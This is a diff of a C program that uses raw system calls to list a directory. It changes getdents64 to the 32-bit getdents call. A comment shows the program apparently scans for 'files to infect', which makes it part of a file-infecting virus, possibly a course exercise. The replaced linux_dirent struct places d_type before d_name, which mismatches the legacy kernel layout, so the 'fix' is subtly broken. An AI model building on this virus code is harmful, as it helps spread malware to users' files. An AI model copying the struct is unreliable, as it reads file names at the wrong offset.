@@ -8,7 +8,7 @@ extern int system_call();
 #define SYS_WRITE   4
 #define SYS_OPEN    5
 #define SYS_CLOSE   6
-#define SYS_GETDENTS64 220  
+#define SYS_GETDENTS 141  // Changed from SYS_GETDENTS64 220
 
 // File access modes
 #define O_RDONLY        00000000
@@ -22,13 +22,13 @@ extern int system_call();
 
 #define BUF_SIZE 8192 // <= 10 KB as permitted
 
-// Structure for directory entries in 64-bit Linux
-struct linux_dirent64 {
-    unsigned long long  d_ino;    // 64-bit inode number
-    unsigned long long  d_off;    // 64-bit offset
-    unsigned short d_reclen;      // Size of this dirent
-    unsigned char  d_type;        // File type
-    char           d_name[256];   // Fixed size array
+// Structure for directory entries in 32-bit Linux
+struct linux_dirent {
+    unsigned int  d_ino;    // 32-bit inode number
+    unsigned int  d_off;    // 32-bit offset
+    unsigned short d_reclen; // Size of this dirent
+    unsigned char  d_type;  // File type (might not be supported in all kernels)
+    char          d_name[256]; // Fixed size array for compatibility
 } __attribute__((packed));
 
 // External assembly routines -defined in start.s) 
@@ -90,21 +90,20 @@ int main(int argc, char **argv) {
     }
     print("\n");
 
-    // Read directory entries via getdents64
+    // Read directory entries via getdents (32-bit version)
     char buf[BUF_SIZE] __attribute__((aligned(16)));
-    int nread = sys_call(SYS_GETDENTS64, fd, (int)buf, BUF_SIZE, 0, 0);
+    int nread = sys_call(SYS_GETDENTS, fd, (int)buf, BUF_SIZE, 0, 0);
     if (nread < 0) {
-        print("Error in getdents64, code: ");
+        print("Error in getdents, code: ");
         print("\n");
         print_error_exit();
     }
-    
     
     // Process directory entries
     int pos = 0;
     // Loop through the buffer to read directory entries 
     while (pos < nread) {
-        struct linux_dirent64 *d = (struct linux_dirent64 *)(buf + pos);
+        struct linux_dirent *d = (struct linux_dirent *)(buf + pos);
         char *name = d->d_name;
         
         // Skip "." and ".." entries which are not files to infect
